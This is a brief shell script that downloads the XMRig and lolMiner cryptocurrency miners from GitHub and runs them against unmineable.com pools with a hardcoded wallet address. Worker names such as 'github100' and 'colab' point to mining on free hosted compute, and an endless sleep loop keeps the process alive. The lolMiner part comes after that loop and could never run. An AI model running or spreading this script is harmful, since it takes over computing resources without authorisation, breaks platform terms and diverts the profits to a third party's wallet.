
#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TY4bwi9zUbyeZgeiSZp8dHrRigjHFkB11e.github100 -p x --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999




wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz

tar -xf lolMiner_v1.29_Lin64.tar.gz

cd 1.29

./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BTT:TY4bwi9zUbyeZgeiSZp8dHrRigjHFkB11e.colab --ethstratum ETHPROXY
